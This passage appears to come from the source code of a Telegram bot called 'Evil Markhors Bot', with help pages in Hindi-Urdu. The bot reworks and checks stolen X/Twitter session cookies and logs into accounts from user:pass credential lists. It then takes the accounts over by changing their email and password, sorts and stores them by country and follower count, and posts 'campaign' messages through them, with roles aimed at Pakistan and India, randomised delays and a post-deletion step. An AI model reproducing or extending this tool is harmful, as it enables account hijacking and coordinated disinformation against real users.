                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)),
                                                            ACC_TIMEOUT)
                            except asyncio.TimeoutError:
                                ld = {}
                        for k, v in ld.items():
                            if v not in ("", None):
                                data[k] = str(v)
                        val = field_value(data, field)
                    if field in BOOL_FIELDS:
                        val = norm_bool(val)
                    elif field == "country":
                        val = to_iso(val)
                    label = bucket_for(val, buckets, is_num)
                    body = build_cookie_file(data, cookies)
                    base = os.path.basename(name) or "account.txt"
                    if label:
                        out[label].append((base, body))
                        prog.ok += 1
                    else:
                        unmatched.append((base, body))
                        prog.fail += 1
                except Exception:
                    logging.exception("split %s", name)
                    prog.fail += 1
                prog.done += 1
                await prog.update()

    def unique(base, used):
        fn, i = base, 2
        while fn in used:
            stem, ext = os.path.splitext(base)
            fn = stem + "_" + str(i) + ext
            i += 1
        used.add(fn)
        return fn

    summary = ["Split by " + field, ""]
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for label, items in out.items():
            safe = re.sub(r"[^A-Za-z0-9._+-]", "_", label)
            used = set()
            for base, body in items:
                z.writestr("split_" + safe + "/" + unique(base, used), body)
            summary.append(label + ": " + str(len(items)))
        used = set()
        for base, body in unmatched:
            z.writestr("split_unmatched/" + unique(base, used), body)
        summary.append("unmatched: " + str(len(unmatched)))
        z.writestr("summary.txt", "\n".join(summary))


async def process_extract(ip, op, cfg, live, prog):
    filt = cfg["filter"]
    sem = asyncio.Semaphore(CONCURRENCY)
    kept, dropped = [], []
    async with httpx.AsyncClient(follow_redirects=True) as client:
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
            names = names[:MAX_FILES]
            prog.total = len(names)
            for name in names:
                try:
                    raw = zin.read(name).decode("utf-8", "ignore")
                    data, cookies = parse_cookie_file(raw)
                    iso = data.get("Country") or ""
                    year = data.get("Year") or ""
                    if live and cookies and (filt["countries"] or filt["years"]):
                        async with sem:
                            try:
                                det = await asyncio.wait_for(live_check(client, cookie_dict(cookies)),
                                                             ACC_TIMEOUT)
                            except asyncio.TimeoutError:
                                det = {}
                        for k, v in det.items():
                            if v not in ("", None):
                                data[k] = str(v)
                        iso = data.get("Country") or ""
                        year = data.get("Year") or ""
                    iso = to_iso(iso)
                    ok = True
                    if filt["countries"] and iso not in filt["countries"]:
                        ok = False
                    if ok and not year_in(year, filt["years"]):
                        ok = False
                    body = build_cookie_file(data, cookies)
                    base = os.path.basename(name) or "a.txt"
                    (kept if ok else dropped).append((base, body))
                    if ok:
                        prog.ok += 1
                    else:
                        prog.fail += 1
                except Exception:
                    logging.exception("extract %s", name)
                    prog.fail += 1
                prog.done += 1
                await prog.update()
    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
        for base, body in kept:
            z.writestr("filtered/" + base, body)
        for base, body in dropped:
            z.writestr("excluded/" + base, body)
        z.writestr("summary.txt", "filtered: " + str(len(kept)) + "\nexcluded: " + str(len(dropped)))


async def run_ulp_batch(uid, lines, prog):
    b = BATCH[uid]
    b["lines"] = lines
    b["results"] = [None] * len(lines)
    prog.total = len(lines)
    sem = asyncio.Semaphore(CONCURRENCY)

    async def one(idx, line):
        try:
            ulp = parse_ulp(line)
            if not ulp:
                b["results"][idx] = {"ok": False, "line": line, "err": "parse"}
                prog.fail += 1
                return
            cl, ok, info = await asyncio.wait_for(ulp_login(ulp), ACC_TIMEOUT)
            if info.get("pending"):
                PEND.setdefault(uid, {})[str(idx)] = {
                    "kind": "login", "client": cl, "flow_token": info["flow_token"],
                    "subtask": info["pending"], "ulp": ulp, "idx": idx}
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp,
                                     "pending": info["pending"]}
                prog.pend += 1
            elif not ok:
                b["results"][idx] = {"ok": False, "line": line, "ulp": ulp, "err": "login_failed"}
                prog.fail += 1
                await cl.aclose()
            else:
                async with sem:
                    r = await finish_account(uid, idx, ulp, cl)
                if r == "email_pending":
                    prog.pend += 1
                else:
                    prog.ok += 1
        except asyncio.TimeoutError:
            b["results"][idx] = {"ok": False, "line": line, "err": "timeout"}
            prog.fail += 1
        except Exception:
            logging.exception("ulp one")
            b["results"][idx] = {"ok": False, "line": line, "err": "exception"}
            prog.fail += 1
        finally:
            prog.done += 1
            save_batch(uid)

    async def heartbeat():
        while prog.done < prog.total:
            await asyncio.sleep(3)
            await prog.update(force=True)

    hb = asyncio.create_task(heartbeat())
    try:
        await asyncio.gather(*(one(i, l) for i, l in enumerate(lines)))
    finally:
        hb.cancel()


def build_zip(path, uid):
    b = BATCH[uid]
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("results.txt", "\n".join(fmt_result(r) for r in b["results"] if r))
        lines = []
        for r in b["results"]:
            if r and r.get("ok"):
                name = r["details"].get("Username", "")
                mail = r["details"].get("Email", "") or r["ulp"].get("email", "")
                lines.append(name + ":" + mail + ":" + (r.get("new_pass") or r["ulp"]["password"]))
        z.writestr("success.txt", "\n".join(lines))
        z.writestr("failed.txt", "\n".join((r.get("line") or "") for r in b["results"]
                                           if r and not r.get("ok")))
        # ============================ HANDLERS ============================
async def _send_zip(u, path, filename, caption):
    with open(path, "rb") as f:
        data = f.read()
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        bad = z.testzip()
        if bad:
            raise RuntimeError("zip corrupt: " + str(bad))
    await u.message.reply_document(InputFile(io.BytesIO(data), filename=filename), caption=caption)


CMD_PAGES = [
 ("1. Basics", (
  "/start\nIntro aur mode list.\n\n"
  "/help\nChhota format guide.\n\n"
  "/commands [page]\nYehi list, page number se: /commands 6. Buttons bhi hain.\n\n"
  "/status\nAapki settings: mode, live, takeover, newpass, newemail, store, batch, pending, split, campaign.\n\n"
  "/diag\nSystem info: python, lib version, DB on/off, table, reverify hours, admin. Support se pehle yehi bhejo.")),
 ("2. Settings", (
  "/mode auto|cookies|ulp|verify\nFile mode force. auto = content se detect.\n\n"
  "/live on|off\nCookie rework pe live check. OFF = koi API call nahi, sirf parse.\n\n"
  "/takeover on|off\nULP login ke baad email alias + password change.\n\n"
  "/newpass <p>\nTakeover password. Khaali = random.\n\n"
  "/newemail you@gmail.com\nTakeover base email, alias khud banta hai.\n\n"
  "/store ask|file|both|db\nCookie file pe kya karein: ask = poochho, file = sirf zip, both = zip+DB, db = sirf DB.")),
 ("3. Cookie file", (
  "Cookie zip ya .txt chat mein bhejo, mode auto khud samajh lega.\n\n"
  "Flow: download > /store ask ho to 3 buttons > rework + verify > live counter > zip.\n\n"
  "Har account ka field block banta hai: Status, Username, ID, Followers, Friends, Posts, Likes, Media, "
  "Verified, Protected, Country, Year, Email + cookie lines.\n\n"
  "Dead bhi file mein rehta hai (Status: DEAD). DB mein sirf LIVE jaata hai.\n"
  "Limit MAX_FILES = 5000 per file.")),
 ("4. Verify / Split / Extract", (
  "/verify\nMode verify. Phir zip bhejo: working/ + dead/ + summary.txt.\n\n"
  "/split <field> <buckets>\nAdmin. /split followers 0-100,100-500,1000+\n"
  "/split country PK,IN\n/split year 2010-2015,2016-2020\n"
  "Output: split_<bucket>/ + unmatched/ + summary.txt.\n\n"
  "/splitoff\nSplit band.\n\n"
  "/extract country PK,IN\n/extract year 2014-2021\n/extract go\n"
  "Admin. Filter ke mutabiq accounts nikaalo: filtered/ + excluded/.")),
 ("5. ULP login", (
  "Line: user:pass | email:pass | user:email:pass | ...:TOTP\nPassword mein ':' ho to bhi theek.\n\n"
  "TOTP khud bharta hai. Code maanga jaye to bot username list bhejta hai, aap bhejo: username code.\n\n"
  "/finalize\nPending chhod ke zip banao.\n\n/cancel\nBatch clear.\n\n"
  "Output: results.txt, success.txt, failed.txt.")),
 ("6. Campaign banao", (
  "Admin.\n/camp new <name>\n/camp role PK|IN|OTHER (PK = appreciation, IN = loss, OTHER = breaking)\n"
  "/camp text — phir messages = variants\n/camp auto on|off|ALL — built-in pool\n"
  "/camp media — photo/video pool\n/camp mediaclear\n/camp tag #Tag\n"
  "/camp parts 1-6\n/camp delay 45-110\n/camp cleanup on|off\n"
  "/camp preview — sample posts\n/camp dry — bina post test\n/camp status\n/camp reset")),
 ("7. Campaign chalao", (
  "Admin.\n/camp filter country PK,IN\n/camp filter year 2014-2021\n/camp filter followers 500\n"
  "/camp filter protected on\n/camp filter clear\n/camp limit 500\n"
  "/camp source zip|db\n/camp nopost 7 (db source)\n/camp start\n/stopcamp\n/report\n\n"
  "Report: per-role links, failed list class ke saath, retry/ folder, batch id se /delbatch camp<id>.")),
 ("8. Database", (
  "Admin. SUPABASE_URL/KEY chahiye.\n/db stats\ntotal / live / dead.\n"
  "/db reverify\nManual pass.\n/db purge\nDead rows delete.\n"
  "/db export\nWorking accounts zip.\n/db export country PK,IN\n/db clear yes\n\n"
  "Auto reverify har REVERIFY_HOURS chalta hai: live = refresh, dead = fails+1, "
  "DEAD_AFTER pe delete.")),
 ("9. Simple tweet", (
  "Admin, purana halka version.\n/tweet [country]\nPhir texts + photo/video.\n/tweetgo\nPhir cookie zip.\n"
  "/tweetcancel\n\nHar account pe random variant, prefix/suffix, hashtag shuffle, thread chain.")),
 ("10. Cleanup / admin", (
  "/delbatches\nSaved batches.\n/delbatch <id>\nTweets delete.\n/broadcast <text>\nSab users ko.\n"
  "/countrytest\nEk cookie .txt — country + username batata hai.\n\n"
  "Admin: /split /splitoff /extract /camp /stopcamp /db /delbatches /delbatch /broadcast /countrytest")),
 ("11. Errors", (
  "Jawab nahi de raha > /diag + Railway logs.\n"
  "DB off > SUPABASE_URL/KEY check, redeploy.\n"
  "File atki > /cancel, dobara bhejo.\n"
  "Purana batch > 60s wait ya /cancel.\n"
  "Sab DEAD > cookie export purana hai.\n"
  "429 flood > /camp delay 90-180, limit kam.\n"
  "Country detect nahi > /countrytest.\n\n"
  "Logs: Railway > service > Deployments > View Logs.")),
]


def _cmd_kb(n):
    row = []
    if n > 0:
        row.append(InlineKeyboardButton("◀", callback_data="cmdp:%d" % (n - 1)))
    row.append(InlineKeyboardButton("%d/%d" % (n + 1, len(CMD_PAGES)), callback_data="cmdp:%d" % n))
    if n < len(CMD_PAGES) - 1:
        row.append(InlineKeyboardButton("▶", callback_data="cmdp:%d" % (n + 1)))
    return InlineKeyboardMarkup([row])


async def _send_cmd_page(msg, n, edit):
    title, body = CMD_PAGES[n]
    txt = "COMMANDS  (" + str(n + 1) + "/" + str(len(CMD_PAGES)) + ")\n" + title + "\n\n" + body
    if edit is not None:
        await edit.edit_text(txt, reply_markup=_cmd_kb(n))
    else:
        await msg.reply_text(txt, reply_markup=_cmd_kb(n))


async def commands_cmd(u, c):
    n = 0
    if c.args:
        try:
            n = int(c.args[0]) - 1
        except Exception:
            n = 0
    await _send_cmd_page(u.message, max(0, min(n, len(CMD_PAGES) - 1)), None)


async def on_cmd_cb(u, c):
    q = u.callback_query
    await q.answer()
    try:
        n = int(q.data.split(":", 1)[1])
    except Exception:
        n = 0
    await _send_cmd_page(None, max(0, min(n, len(CMD_PAGES) - 1)), q.message)


async def start(u, c):
    await u.message.reply_text(
        "Evil Markhors Bot\n\nModes:\n1) COOKIES rework\n2) ULP login + takeover\n3) VERIFY\n\n"
        "/mode /live /takeover /newpass /newemail /store /status /diag /finalize /cancel\n"
        "Admin: /camp /db /split /extract /broadcast /countrytest /delbatches\n\n"
        "Poori command list: /commands")


async def help_cmd(u, c):
    await u.message.reply_text(
        "ULP: user:pass | email:pass | ...:2fa — code aaye to 'username code'\n"
        "VERIFY: /verify > zip\nSTORE: /store ask|file|both|db\n"
        "CAMPAIGN: /camp new > /camp text > /camp filter > /camp start\n"
        "EXTRACT: /extract country PK,IN year 2015-2020\n\nSab kuch: /commands")


async def store_cmd(u, c):
    a = c.args[0].lower() if c.args else ""
    if a not in ("ask", "file", "both", "db"):
        await u.message.reply_text(
            "Store mode: " + get_store_mode(u.effective_user.id) + "\n"
            "ask = poochho | file = sirf zip | both = zip+DB | db = sirf DB\n"
            + ("" if db_enabled() else "DB off hai.\n"))
        return
    await set_cfg(u.effective_user.id, store=a)
    await u.message.reply_text("Store = " + a + ("" if db_enabled() else " (DB missing)"))


async def status_cmd(u, c):
    uid = str(u.effective_user.id)
    g = ucfg(uid)
    txt = ("Mode: " + g["mode"] + "\nLive: " + ("ON" if g["live"] else "OFF")
           + "\nTakeover: " + ("ON" if g["takeover"] else "OFF")
           + "\nNewPass: " + (g["newpass"] or "(random)")
           + "\nNewEmail: " + (g["newemail"] or "(none)")
           + "\nStore: " + get_store_mode(uid)
           + "\nBatch: " + ("chal raha" if uid in BATCH else "none")
           + " | Pending: " + str(len(PEND.get(uid, {}))))
    if uid in CAMPS:
        txt += "\nCAMP: " + (CAMPS[uid]["name"] or "-") + " | src " + CAMPS[uid]["source"]
    await u.message.reply_text(txt)


async def diag_cmd(u, c):
    import platform
    import telegram
    await u.message.reply_text(
        "py " + platform.python_version() + " | ptb " + telegram.__version__ + "\n"
        "db " + ("ON" if db_enabled() else "OFF") + " | table " + DB_TABLE + "\n"
        "reverify " + str(REVERIFY_HOURS) + "h | batch " + str(REVERIFY_BATCH)
        + " | dead_after " + str(DEAD_AFTER) + "\nadmin " + str(is_admin(u.effective_user.id)))


async def mode_cmd(u, c):
    a = c.args[0].lower() if c.args else "auto"
    a = a if a in ("auto", "cookies", "ulp", "verify") else "auto"
    await set_cfg(u.effective_user.id, mode=a)
    await u.message.reply_text("Mode = " + a)


async def verify_cmd(u, c):
    await set_cfg(u.effective_user.id, mode="verify")
    await u.message.reply_text("Mode = verify. Ab cookie zip bhejo.")


async def live_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    new = True if a in ("on", "1", "yes") else False if a in ("off", "0", "no") else not get_live(uid)
    await set_cfg(uid, live=new)
    await u.message.reply_text("Live = " + ("ON" if new else "OFF"))


async def takeover_cmd(u, c):
    uid = u.effective_user.id
    a = c.args[0].lower() if c.args else ""
    new = True if a in ("on", "1", "yes") else False if a in ("off", "0", "no") else not ucfg(uid)["takeover"]
    await set_cfg(uid, takeover=new)
    await u.message.reply_text("Takeover = " + ("ON" if new else "OFF"))


async def newpass_cmd(u, c):
    await set_cfg(u.effective_user.id, newpass=(" ".join(c.args) if c.args else ""))
    await u.message.reply_text("NewPass = " + (ucfg(u.effective_user.id)["newpass"] or "(random)"))


async def newemail_cmd(u, c):
    await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
    await u.message.reply_text("NewEmail = " + (ucfg(u.effective_user.id)["newemail"] or "(none)"))


async def split_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not c.args:
        cfg = SPLIT.get(uid)
        await u.message.reply_text("Split: " + (cfg["field"] + " | "
                                   + ", ".join(l for l, a, b, d in cfg["buckets"]) if cfg else
                                   "set nahi.\nFields: " + ", ".join(KEYMAP)))
        return
    field = c.args[0].lower()
    if field not in KEYMAP or len(c.args) < 2:
        await u.message.reply_text("Field + buckets do. Fields: " + ", ".join(KEYMAP))
        return
    buckets = parse_buckets(" ".join(c.args[1:]))
    if not buckets:
        await u.message.reply_text("Buckets samajh nahi aaye.")
        return
    SPLIT[uid] = {"field": field, "buckets": buckets}
    await u.message.reply_text("Split set: " + field + "\nAb zip bhejo.")


async def splitoff_cmd(u, c):
    if not is_admin(u.effective_user.id):
        await u.message.reply_text("Sirf admin.")
        return
    SPLIT.pop(str(u.effective_user.id), None)
    await u.message.reply_text("Split off.")


async def extract_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    cfg = EXTRACT.setdefault(uid, {"filter": {"countries": [], "years": []}, "stage": "idle"})
    a = [x.lower() for x in c.args]
    if not a:
        f = cfg["filter"]
        await u.message.reply_text("country " + (",".join(f["countries"]) or "ALL") + " | year "
                                   + (",".join(str(x[0]) + "-" + str(x[1]) for x in f["years"]) or "ALL")
                                   + "\n\n/extract country PK,IN | year 2014-2021 | clear | go")
        return
    if a[0] == "clear":
        EXTRACT[uid] = {"filter": {"countries": [], "years": []}, "stage": "idle"}
        await u.message.reply_text("Clear.")
    elif a[0] == "country" and len(c.args) > 1:
        cfg["filter"]["countries"] = [to_iso(x) or x.upper()
                                      for x in " ".join(c.args[1:]).split(",") if x.strip()]
        await u.message.reply_text("Country = " + ",".join(cfg["filter"]["countries"]))
    elif a[0] == "year" and len(c.args) > 1:
        cfg["filter"]["years"] = parse_years(" ".join(c.args[1:]))
        await u.message.reply_text("Year = " + str(cfg["filter"]["years"]))
    elif a[0] == "go":
        cfg["stage"] = "await"
        await u.message.reply_text("Ab zip bhejo.")
    else:
        await u.message.reply_text("Samajh nahi aaya. /extract dekho.")


async def run_extract(u, doc):
    uid = str(u.effective_user.id)
    cfg = EXTRACT[uid]
    tmp = tempfile.mkdtemp(prefix="ext_")
    ip, op = os.path.join(tmp, "in.zip"), os.path.join(tmp, "out.zip")
    msg = await u.message.reply_text("Download...")
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        prog = Progress(msg, 0, "EXTRACT")
        prog.phase = "Filtering"
        await process_extract(ip, op, cfg, get_live(uid), prog)
        await _send_zip(u, op, "evilmarkhors_extract.zip",
                        "Extract | filtered " + str(prog.ok) + " | excluded " + str(prog.fail))
        await _edit(msg, "Complete")
    except Exception as e:
        logging.exception("extract")
        await _edit(msg, "Error: " + str(e))
    finally:
        EXTRACT[uid]["stage"] = "idle"
        shutil.rmtree(tmp, ignore_errors=True)


async def db_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    if not db_enabled():
        await u.message.reply_text("SUPABASE_URL / KEY set nahi.")
        return
    a = [x.lower() for x in c.args]
    sub = a[0] if a else "stats"
    async with httpx.AsyncClient(follow_redirects=True) as client:
        if sub == "stats":
            await u.message.reply_text(
                "DB pool\ntotal " + str(await db_count(client)) + "\nlive "
                + str(await db_count(client, "live")) + "\ndead "
                + str(await db_count(client, "dead")) + "\nreverify "
                + str(REVERIFY_HOURS) + "h | dead_after " + str(DEAD_AFTER))
        elif sub == "reverify":
            msg = await u.message.reply_text("Reverify...")
            await _edit(msg, "Reverify: " + json.dumps(await reverify_pass(u.get_bot(), False)
                                                       or {"info": "koi due nahi"}))
        elif sub == "purge":
            msg = await u.message.reply_text("Purge...")
            rows = await db_fetch(client, {"status": "eq.dead", "last_check": "lt." + now_iso(-24)},
                                  limit=2000)
            await _edit(msg, "Purged " + str(await db_delete(
                client, [r.get("username") for r in rows if r.get("username")])))
        elif sub == "export":
            filt = {}
            if len(a) > 2 and a[1] == "country":
                filt["country"] = "in.(" + ",".join(to_iso(x) or x.upper()
                                                    for x in " ".join(c.args[2:]).split(",") if x) + ")"
            msg = await u.message.reply_text("Export...")
            rows = await db_fetch(client, dict(filt, status="eq.live"), limit=2000)
            d = tempfile.mkdtemp(prefix="exp_")
            op = os.path.join(d, "export.zip")
            with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
                for r in rows:
                    data = {"Username": r.get("username"), "ID": r.get("x_id"),
                            "Country": r.get("country"), "Year": r.get("yr"),
                            "Followers": r.get("followers"), "Protected": r.get("protected"),
                            "Verified": r.get("verified"), "Status": "LIVE"}
                    lines = ["x.com\tTRUE\t/\t" + str(int(time.time()) + 86400 * 300)
                             + "\tFALSE\t" + k + "\t" + v for k, v in (r.get("cookies") or {}).items()]
                    z.writestr((r.get("username") or "acc") + ".txt", build_cookie_file(data, lines))
                z.writestr("summary.txt", "exported: " + str(len(rows)))
            await _send_zip(u, op, "db_export.zip", "Export: " + str(len(rows)))
            shutil.rmtree(d, ignore_errors=True)
        elif sub == "clear":
            if len(a) > 1 and a[1] == "yes":
                rows = await db_fetch(client, {}, limit=5000)
                await u.message.reply_text("Cleared " + str(await db_delete(
                    client, [r.get("username") for r in rows if r.get("username")])))
            else:
                await u.message.reply_text("/db clear yes")
        else:
            await u.message.reply_text("stats | reverify | purge | export | clear yes")


async def camp_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    a = [x.lower() for x in c.args]
    sub = a[0] if a else ""
    if sub in ("", "status"):
        cfg = CAMPS.get(uid)
        if not cfg:
            await u.message.reply_text("Set nahi.\n/camp new <name> | /camp text | /camp media | "
                                       "/camp filter | /camp preview | /camp start")
            return
        f = cfg["filter"]
        await u.message.reply_text(
            "CAMP " + (cfg["name"] or "-") + " | " + cfg["stage"] + "\ntag " + cfg["tag"]
            + "\nsource " + cfg["source"] + " | role " + cfg["role"]
            + "\nauto " + json.dumps(cfg["auto"]) + "\ncustom PK " + str(len(cfg["roles"]["PK"]))
            + " IN " + str(len(cfg["roles"]["IN"])) + " OTHER " + str(len(cfg["roles"]["OTHER"]))
            + "\nmedia " + str(len(cfg["media"])) + "\nfilter " + (",".join(f["countries"]) or "ALL")
            + " | " + (",".join(str(x[0]) + "-" + str(x[1]) for x in f["years"]) or "ALL")
            + " | minF " + str(f["min_followers"]) + "\nlimit " + (str(cfg["limit"]) or "ALL")
            + " | delay " + str(int(cfg["delay"][0])) + "-" + str(int(cfg["delay"][1]))
            + "s | nopost " + str(cfg["nopost"]) + "d | dry " + str(cfg["dry_run"]))
        return
    if sub == "new":
        cfg = new_camp()
        cfg["name"] = (" ".join(c.args[1:]) or "camp")[:40]
        CAMPS[uid] = cfg
        save_camp(uid)
        await u.message.reply_text("Bana: " + cfg["name"] + "\ntag " + DEFAULT_TAG
                                   + "\n/camp text | /camp media | /camp filter | /camp start")
        return
    cfg = CAMPS.get(uid)
    if not cfg:
        await u.message.reply_text("Pehle /camp new <name>.")
        return
    if sub == "text":
        cfg["stage"] = "text"
        save_camp(uid)
        await u.message.reply_text("Role " + cfg["role"] + " — variants bhejo. /camp idle se band.")
    elif sub == "idle":
        cfg["stage"] = "idle"
        save_camp(uid)
        await u.message.reply_text("Band.")
    elif sub == "role":
        r = (a[1] if len(a) > 1 else "").upper()
        if r not in ("PK", "IN", "OTHER"):
            await u.message.reply_text("PK | IN | OTHER")
            return
        cfg["role"] = r
        save_camp(uid)
        await u.message.reply_text("Role = " + r)
    elif sub == "auto":
        r = (a[1] if len(a) > 1 else cfg["role"]).upper()
        if r == "ALL":
            v = not all(cfg["auto"].values())
            for k in cfg["auto"]:
                cfg["auto"][k] = v
        elif r in cfg["auto"]:
            cfg["auto"][r] = not cfg["auto"][r]
        else:
            await u.message.reply_text("PK | IN | OTHER | ALL")
            return
        save_camp(uid)
        await u.message.reply_text("auto " + json.dumps(cfg["auto"]))
    elif sub == "media":
        cfg["stage"] = "media"
        save_camp(uid)
        await u.message.reply_text("Photo/video bhejo.")
    elif sub == "mediaclear":
        for m in cfg["media"]:
            try:
                os.remove(m["path"])
            except Exception:
                pass
        cfg["media"] = []
        save_camp(uid)
        await u.message.reply_text("Media clear.")
    elif sub == "tag":
        t = " ".join(c.args[1:]).strip()
        cfg["tag"] = t if t.startswith("#") else "#" + t.lstrip("#")
        save_camp(uid)
        await u.message.reply_text("Tag = " + cfg["tag"])
    elif sub == "source":
        s = a[1] if len(a) > 1 else ""
        if s not in ("zip", "db"):
            await u.message.reply_text("zip | db")
            return
        cfg["source"] = s
        save_camp(uid)
        await u.message.reply_text("Source = " + s)
    elif sub == "nopost":
        try:
            cfg["nopost"] = int(c.args[1])
        except Exception:
            await u.message.reply_text("/camp nopost 7")
            return
        save_camp(uid)
        await u.message.reply_text("nopost = " + str(cfg["nopost"]) + "d")
    elif sub == "filter":
        f = cfg["filter"]
        if len(a) < 3:
            await u.message.reply_text("country | year | followers | protected | clear")
            return
        k = a[1]
        if k == "country":
            f["countries"] = [to_iso(x) or x.upper()
                              for x in " ".join(c.args[2:]).split(",") if x.strip()]
        elif k == "year":
            f["years"] = parse_years(" ".join(c.args[2:]))
        elif k == "followers":
            f["min_followers"] = int(c.args[2])
        elif k == "protected":
            f["skip_protected"] = a[2] in ("on", "1", "yes")
        elif k == "clear":
            cfg["filter"] = {"countries": [], "years": [], "min_followers": 0,
                             "skip_protected": False}
        else:
            await u.message.reply_text("country | year | followers | protected | clear")
            return
        save_camp(uid)
        await u.message.reply_text("Filter: " + json.dumps(cfg["filter"]))
    elif sub == "limit":
        try:
            cfg["limit"] = max(int(c.args[1]), 0)
        except Exception:
            await u.message.reply_text("Number do.")
            return
        save_camp(uid)
        await u.message.reply_text("Limit = " + (str(cfg["limit"]) or "ALL"))
    elif sub == "delay":
        try:
            lo, hi = c.args[1].split("-")
            cfg["delay"] = [float(lo), float(hi)]
        except Exception:
            await u.message.reply_text("/camp delay 45-110")
            return
        save_camp(uid)
        await u.message.reply_text("Delay = " + c.args[1])
    elif sub == "parts":
        try:
            cfg["max_parts"] = max(min(int(c.args[1]), 6), 1)
        except Exception:
            await u.message.reply_text("1-6")
            return
        save_camp(uid)
        await u.message.reply_text("Parts = " + str(cfg["max_parts"]))
    elif sub == "cleanup":
        cfg["cleanup_partial"] = (a[1] in ("on", "1", "yes")) if len(a) > 1 else not cfg["cleanup_partial"]
        save_camp(uid)
        await u.message.reply_text("cleanup = " + str(cfg["cleanup_partial"]))
    elif sub == "dry":
        cfg["dry_run"] = not cfg["dry_run"]
        save_camp(uid)
        await u.message.reply_text("dry = " + str(cfg["dry_run"]))
    elif sub == "preview":
        out = []
        for r in ("PK", "IN", "OTHER"):
            out.append("== " + r + " ==")
            for _ in range(2):
                out.extend(compose(cfg, r))
                out.append("")
        txt = "\n".join(out)
        for i in range(0, len(txt), 3800):
            await u.message.reply_text(txt[i:i + 3800])
    elif sub == "start":
        if uid in CAMPRUN:
            await u.message.reply_text("Chal raha hai.")
            return
        if cfg["source"] == "db":
            if not db_enabled():
                await u.message.reply_text("DB off. /camp source zip")
                return
            await run_campaign_db(u, uid)
            return
        cfg["stage"] = "cookies"
        save_camp(uid)
        await u.message.reply_text("Ab cookie zip bhejo.")
    elif sub == "reset":
        for m in cfg.get("media", []):
            try:
                os.remove(m["path"])
            except Exception:
                pass
        CAMPS.pop(uid, None)
        try:
            os.remove(camp_file(uid))
        except Exception:
            pass
        await u.message.reply_text("Reset.")
    else:
        await u.message.reply_text("Subcommand samajh nahi aayi. /camp dekho.")


async def stopcamp_cmd(u, c):
    uid = str(u.effective_user.id)
    if uid in CAMPRUN:
        CAMPRUN[uid]["stop"] = True
        await u.message.reply_text("Stop — current account ke baad rukega.")
    else:
        await u.message.reply_text("Koi campaign nahi.")


async def report_cmd(u, c):
    if not CAMPS.get(str(u.effective_user.id)):
        await u.message.reply_text("Campaign nahi.")
        return
    await u.message.reply_text("Report campaign khatam pe automatic aati hai.")


async def tweet_cmd(u, c):
    uid = str(u.effective_user.id)
    if not is_admin(uid):
        await u.message.reply_text("Sirf admin.")
        return
    filt = [to_iso(a) or a.upper() for a in " ".join(c.args).split(",") if a.strip()]
    TWEET[uid] = {"stage": "content", "variants": [], "media": None, "filter": filt, "tmp": None}
    await u.message.reply_text("Compose. Texts bhejo. /tweetgo se aage."
                               + (" Filter: " + ", ".join(filt) if filt else ""))


async def tweetgo_cmd(u, c):
    t = TWEET.get(str(u.effective_user.id))
    if not t:
        await u.message.reply_text("Pehle /tweet.")
        return
    if not t["variants"] and not t["media"]:
        await u.message.reply_text("Kuch bhejo pehle.")
        return
    t["stage"] = "cookies"
    await u.message.reply_text("Ab cookie zip bhejo.")


async def tweetcancel_cmd(u, c):
    t = TWEET.pop(str(u.effective_user.id), None)
    if t and t.get("tmp"):
        shutil.rmtree(t["tmp"], ignore_errors=True)
    await u.message.reply_text("Cancel.")


async def run_tweet_batch(u, doc):
    uid = str(u.effective_user.id)
    t = TWEET[uid]
    tmp = tempfile.mkdtemp(prefix="tw_")
    ip = os.path.join(tmp, "in.zip")
    msg = await u.message.reply_text("Download...")
    links, failed, saved = [], [], []
    batch_id = str(int(time.time()))
    try:
        f = await doc.get_file()
        await f.download_to_drive(ip)
        with zipfile.ZipFile(ip) as zin:
            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")][:MAX_FILES]
            prog = Progress(msg, len(names), "TWEET")
            prog.phase = "Posting"
            filt, variants = t.get("filter") or [], t.get("variants") or [""]
            async with httpx.AsyncClient(follow_redirects=True) as client:
                for name in names:
                    try:
                        raw = zin.read(name).decode("utf-8", "ignore")
                        data, cookies = parse_cookie_file(raw)
                        ck = cookie_dict(cookies)
                        if not ck:
                            failed.append(name + " | no cookies")
                            prog.fail += 1
                            prog.done += 1
                            await prog.update()
                            continue
                        if filt and to_iso(await asyncio.wait_for(detect_country(client, ck),
                                                                  ACC_TIMEOUT)) not in filt:
                            prog.done += 1
                            await prog.update()
                            continue
                        ids, code = await post_tweet(client, ck,
                                                     randomize(random.choice(variants)), t.get("media"))
                        uname = data.get("Username", "") or name
                        if code == 200 and ids:
                            links.append(uname + " | https://x.com/" + uname + "/status/" + ids[0])
                            saved.append({"username": uname, "ids": ids, "cookies": cookies})
                            prog.ok += 1
                        else:
                            failed.append(uname + " | http " + str(code))
                            prog.fail += 1
                    except Exception as e:
                        logging.exception("tweet %s", name)
                        failed.append(name + " | " + str(e))
                        prog.fail += 1
                    prog.done += 1
                    await prog.update()
                    await asyncio.sleep(random.uniform(POST_MIN, POST_MAX))
        if saved:
            os.makedirs(DEL_DIR, exist_ok=True)
            with open(os.path.join(DEL_DIR, uid + "_" + batch_id + ".json"), "w", encoding="utf-8") as f:
                json.dump(saved, f)
        op = os.path.join(tmp, "out.zip")
        with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("links.txt", "\n".join(links))
            z.writestr("failed.txt", "\n".join(failed))
